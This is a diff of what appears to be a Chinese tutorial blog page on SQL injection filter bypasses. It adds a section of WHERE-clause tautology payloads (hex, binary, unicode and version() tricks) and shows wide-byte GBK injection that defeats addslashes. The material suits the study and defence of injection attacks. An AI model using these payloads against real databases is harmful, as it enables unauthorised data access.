@@ -107,7 +107,7 @@ SQL语法
 
 
 m">
-<meta property="og:updated_time" content="2015-08-17T06:29:12.411Z">
+<meta property="og:updated_time" content="2015-08-19T01:17:27.271Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入练级攻略(6)-绕过姿势(一)">
 <meta name="twitter:description" content="关于引号在SQL语句中可以使用很多引号  “ 还是 ‘ 只要是成对出现后面的语句可以继续执行
@@ -369,6 +369,21 @@ mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <spa
 <span class="comment">//在and/or之后使用 ！ ~ 代替空格如果注入参数是字符型则and前面的空格可以省略。</span>
 </code></pre><h2 id="and或or后面可以跟的字符">and或or后面可以跟的字符</h2><p><strong>符号: Space , + , - , ~ , ! , @ </strong></p>
 <pre><code>mysql&gt; SELECT <span class="number">1</span> FROM dual WHERE <span class="number">1</span>=<span class="number">1</span> AND-+-+-+-+~~((<span class="number">1</span>));
+</code></pre><h2 id="Where后条件的各种转换姿势">Where后条件的各种转换姿势</h2><pre><code> <span class="string">' or "a"='</span>a<span class="string">'
+'</span> <span class="keyword">or</span> <span class="string">'a'</span>=n<span class="string">'a'</span>               <span class="comment">//unicode</span>
+<span class="string">' or '</span>a<span class="string">'=b'</span><span class="number">1100001</span><span class="string">'         //binary
+'</span> <span class="keyword">or</span> <span class="string">'a'</span>=x<span class="string">'61'</span>              <span class="comment">//16进制</span>
+<span class="string">' or 1=true #true=1, false=0
+'</span> <span class="keyword">or</span> <span class="number">1</span> #<span class="keyword">true</span>
+<span class="string">' or version()=5.5 #5.5.41-log
+'</span> <span class="keyword">or</span> round(pi(),<span class="number">1</span>)+<span class="keyword">true</span>+<span class="keyword">true</span>+<span class="number">0.4</span>=version() <span class="string">#3</span>.<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">0.4</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="string">'a'</span>=<span class="string">'b'</span>=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="string">'a'</span>=<span class="string">'b'</span>)=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="keyword">false</span>)=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="string">'c'</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="number">0</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="keyword">true</span>
+<span class="keyword">select</span> * <span class="keyword">from</span> users
 </code></pre><h2 id="宽字节注入">宽字节注入</h2><p>sql注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
 <p><a href="http://drops.wooyun.org/tips/123" target="_blank" rel="external">摘自乌云知识库</a></p>
 </span>
@@ -529,7 +544,7 @@ mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <spa
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于引号"><span class="nav-number">1.</span> <span class="nav-text">关于引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于注释"><span class="nav-number">2.</span> <span class="nav-text">关于注释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过引号"><span class="nav-number">3.</span> <span class="nav-text">绕过引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过字符串黑名单"><span class="nav-number">4.</span> <span class="nav-text">绕过字符串黑名单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过空格"><span class="nav-number">5.</span> <span class="nav-text">绕过空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#and或or后面可以跟的字符"><span class="nav-number">6.</span> <span class="nav-text">and或or后面可以跟的字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入"><span class="nav-number">7.</span> <span class="nav-text">宽字节注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于引号"><span class="nav-number">1.</span> <span class="nav-text">关于引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于注释"><span class="nav-number">2.</span> <span class="nav-text">关于注释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过引号"><span class="nav-number">3.</span> <span class="nav-text">绕过引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过字符串黑名单"><span class="nav-number">4.</span> <span class="nav-text">绕过字符串黑名单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过空格"><span class="nav-number">5.</span> <span class="nav-text">绕过空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#and或or后面可以跟的字符"><span class="nav-number">6.</span> <span class="nav-text">and或or后面可以跟的字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Where后条件的各种转换姿势"><span class="nav-number">7.</span> <span class="nav-text">Where后条件的各种转换姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入"><span class="nav-number">8.</span> <span class="nav-text">宽字节注入</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
